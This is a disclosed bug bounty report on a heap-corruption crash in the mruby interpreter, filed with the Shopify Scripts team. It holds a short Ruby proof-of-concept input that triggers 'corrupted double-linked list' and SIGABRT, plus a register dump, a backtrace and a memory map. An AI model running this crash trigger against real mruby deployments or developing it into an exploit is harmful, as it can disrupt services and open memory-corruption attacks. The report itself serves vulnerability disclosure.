# SIGABRT - mrb_default_allocf 

## Report Details
- **Report ID**: 193773
- **URL**: https://hackerone.com/reports/193773
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-12-24T10:19:41.107Z
- **Disclosed**: 2017-02-05T04:51:00.541Z

## Reporter
- **Username**: icanthack
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
POC

```
a=b=c=[]
a=[]..t=c
t %W=0 0 0 0 0 0 0
0 0 0 0 0 0 0 0 0
0 0
0 0 0 0 0 0
0 0
0 0 0 0 0
0
0
0
0 0 0 0 0
0 0 0 0 0 0 0 0 0 0 0
0
0 0=
```

output

```
 [----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x2
ECX: 0xbfffe4a0 --> 0x0
EDX: 0x0
ESI: 0x8
EDI: 0x0
EBP: 0xbfffe4a0 --> 0x0
ESP: 0xbfffe490 --> 0xbfffe4a0 --> 0x0
EIP: 0xb7fd9d05 (<__kernel_vsyscall+9>: pop    ebp)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xb7fd9cff <__kernel_vsyscall+3>:    mov    ebp,esp
   0xb7fd9d01 <__kernel_vsyscall+5>:    sysenter
   0xb7fd9d03 <__kernel_vsyscall+7>:    int    0x80
=> 0xb7fd9d05 <__kernel_vsyscall+9>:    pop    ebp
   0xb7fd9d06 <__kernel_vsyscall+10>:   pop    edx
   0xb7fd9d07 <__kernel_vsyscall+11>:   pop    ecx
   0xb7fd9d08 <__kernel_vsyscall+12>:   ret
   0xb7fd9d09:  nop
[------------------------------------stack-------------------------------------]
0000| 0xbfffe490 --> 0xbfffe4a0 --> 0x0
0004| 0xbfffe494 --> 0x0
0008| 0xbfffe498 --> 0xbfffe4a0 --> 0x0
0012| 0xbfffe49c --> 0xb7de8050 (<__GI_raise+176>:      add    esp,0x10c)
0016| 0xbfffe4a0 --> 0x0
0020| 0xbfffe4a4 --> 0x0
0024| 0xbfffe4a8 ("          [vdso]\nb7fdb000-b7ffd000 r-xp 00000000 08:01 919434     /lib/i386-linux-gnu/ld-2.24.so\nb7ffd000-b7ffe000 rw-p \377\377\377\177\376", '\377' <repeats 75 times>...)
0028| 0xbfffe4ac ("      [vdso]\nb7fdb000-b7ffd000 r-xp 00000000 08:01 919434     /lib/i386-linux-gnu/ld-2.24.so\nb7ffd000-b7ffe000 rw-p \377\377\377\177\376", '\377' <repeats 79 times>...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGABRT
0xb7fd9d05 in __kernel_vsyscall ()
```

backtrace

```
#0  0xb7fd9d05 in __kernel_vsyscall ()
#1  0xb7de8050 in __libc_signal_restore_set (set=0xbfffe4a0) at ../sysdeps/unix/sysv/linux/nptl-signals.h:79
#2  __GI_raise (sig=0x6) at ../sysdeps/unix/sysv/linux/raise.c:55
#3  0xb7de9577 in __GI_abort () at abort.c:89
#4  0xb7e23f0f in __libc_message (do_abort=<optimized out>, fmt=<optimized out>) at ../sysdeps/posix/libc_fatal.c:175
#5  0xb7e2ab07 in malloc_printerr (action=<optimized out>, str=0xb7f1fa88 "corrupted double-linked list (not small)", ptr=<optimized out>, ar_ptr=0xb7f72780 <main_arena>)
    at malloc.c:5046
#6  0xb7e2d215 in _int_malloc (av=av@entry=0xb7f72780 <main_arena>, bytes=bytes@entry=0x81) at malloc.c:3762
#7  0xb7e2e6f5 in __GI___libc_malloc (bytes=0x81) at malloc.c:2925
#8  0x080566df in mrb_default_allocf ()
#9  0x08049b80 in mrb_realloc_simple ()
#10 0x08049be4 in mrb_realloc ()
#11 0x08049c9c in mrb_malloc ()
#12 0x08064d22 in mrb_str_buf_new ()
#13 0x08051781 in join_ary ()
#14 0x080519bc in mrb_ary_join ()
#15 0x08057dd0 in mrb_vformat ()
#16 0x08058408 in mrb_no_method_error ()
#17 0x0806213a in mrb_method_missing ()
#18 0x08062194 in mrb_bob_missing ()
#19 0x08073661 in mrb_vm_exec ()
#20 0x08072160 in mrb_vm_run ()
#21 0x08078bc8 in mrb_top_run ()
#22 0x080854c0 in mrb_load_exec ()
#23 0x08085528 in mrb_load_file_cxt ()
#24 0x08049955 in main ()
#25 0xb7dd4276 in __libc_start_main (main=0x80496a8 <main>, argc=0x2, argv=0xbffff624, init=0x80a0cc0 <__libc_csu_init>, fini=0x80a0d20 <__libc_csu_fini>,
    rtld_fini=0xb7fea8a0 <_dl_fini>, stack_end=0xbffff61c) at ../csu/libc-start.c:291
#26 0x08049111 in _start ()
```

Console

```
*** Error in `./bin/mruby': corrupted double-linked list (not small): 0x080eba98 ***
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x67f0a)[0xb7e23f0a]
/lib/i386-linux-gnu/libc.so.6(+0x6eb07)[0xb7e2ab07]
/lib/i386-linux-gnu/libc.so.6(+0x71215)[0xb7e2d215]
/lib/i386-linux-gnu/libc.so.6(__libc_malloc+0xc5)[0xb7e2e6f5]
./bin/mruby[0x80566df]
./bin/mruby[0x8049b80]
./bin/mruby[0x8049be4]
./bin/mruby[0x8049c9c]
./bin/mruby[0x8064d22]
./bin/mruby[0x8051781]
./bin/mruby[0x80519bc]
./bin/mruby[0x8057dd0]
./bin/mruby[0x8058408]
./bin/mruby[0x806213a]
./bin/mruby[0x8062194]
./bin/mruby[0x8073661]
./bin/mruby[0x8072160]
./bin/mruby[0x8078bc8]
./bin/mruby[0x80854c0]
./bin/mruby[0x8085528]
./bin/mruby[0x8049955]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf6)[0xb7dd4276]
./bin/mruby[0x8049111]
======= Memory map: ========
08048000-080df000 r-xp 00000000 08:01 272531     /home/j/mruby/bin/mruby
080df000-080e0000 r--p 00096000 08:01 272531     /home/j/mruby/bin/mruby
080e0000-080e1000 rw-p 00097000 08:01 272531     /home/j/mruby/bin/mruby
080e1000-08145000 rw-p 00000000 00:00 0          [heap]
b7c00000-b7c21000 rw-p 00000000 00:00 0
b7c21000-b7d00000 ---p 00000000 00:00 0
b7d9c000-b7db8000 r-xp 00000000 08:01 917561     /lib/i386-linux-gnu/libgcc_s.so.1
b7db8000-b7db9000 r--p 0001b000 08:01 917561     /lib/i386-linux-gnu/libgcc_s.so.1
b7db9000-b7dba000 rw-p 0001c000 08:01 917561     /lib/i386-linux-gnu/libgcc_s.so.1
b7dba000-b7dbc000 rw-p 00000000 00:00 0
b7dbc000-b7f6f000 r-xp 00000000 08:01 932261     /lib/i386-linux-gnu/libc-2.24.so
b7f6f000-b7f70000 ---p 001b3000 08:01 932261     /lib/i386-linux-gnu/libc-2.24.so
b7f70000-b7f72000 r--p 001b3000 08:01 932261     /lib/i386-linux-gnu/libc-2.24.so
b7f72000-b7f73000 rw-p 001b5000 08:01 932261     /lib/i386-linux-gnu/libc-2.24.so
b7f73000-b7f76000 rw-p 00000000 00:00 0
b7f76000-b7fc9000 r-xp 00000000 08:01 932265     /lib/i386-linux-gnu/libm-2.24.so
b7fc9000-b7fca000 ---p 00053000 08:01 932265     /lib/i386-linux-gnu/libm-2.24.so
b7fca000-b7fcb000 r--p 00053000 08:01 932265     /lib/i386-linux-gnu/libm-2.24.so
b7fcb000-b7fcc000 rw-p 00054000 08:01 932265     /lib/i386-linux-gnu/libm-2.24.so
b7fd4000-b7fd7000 rw-p 00000000 00:00 0
b7fd7000-b7fd9000 r--p 00000000 00:00 0          [vvar]
b7fd9000-b7fdb000 r-xp 00000000 00:00 0          [vdso]
b7fdb000-b7ffd000 r-xp 00000000 08:01 919434     /lib/i386-linux-gnu/ld-2.24.so
b7ffd000-b7ffe000 rw-p 00000000 00:00 0
b7ffe000-b7fff000 r--p 00022000 08:01 919434     /lib/i386-linux-gnu/ld-2.24.so
b7fff000-b8000000 rw-p 00023000 08:01 919434     /lib/i386-linux-gnu/ld-2.24.so
bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
Aborted (core dumped)
```



## Attachments
No attachments
